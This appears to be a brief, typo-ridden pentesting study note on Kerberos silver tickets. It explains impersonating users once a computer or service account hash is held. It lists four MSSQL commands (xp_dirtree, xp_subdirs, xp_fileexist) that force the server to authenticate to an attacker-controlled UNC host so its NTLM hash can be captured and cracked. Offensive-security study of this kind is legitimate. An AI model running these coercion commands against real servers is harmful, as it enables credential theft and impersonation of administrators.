
Now what the hell ares sliver tickers aka spn's ; 


Sceanario 1 : WE have nthash  of computer$ then we can impersonate any users ;


Sceanario 2: We have nthash of serivce account of any services aka mssql , ldap , Groups , then we can impersonate the admin accounts ; 



Eg: We can coeherce / steal ntlm hash from mssql ; 

```
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'
```

Crack the password ; 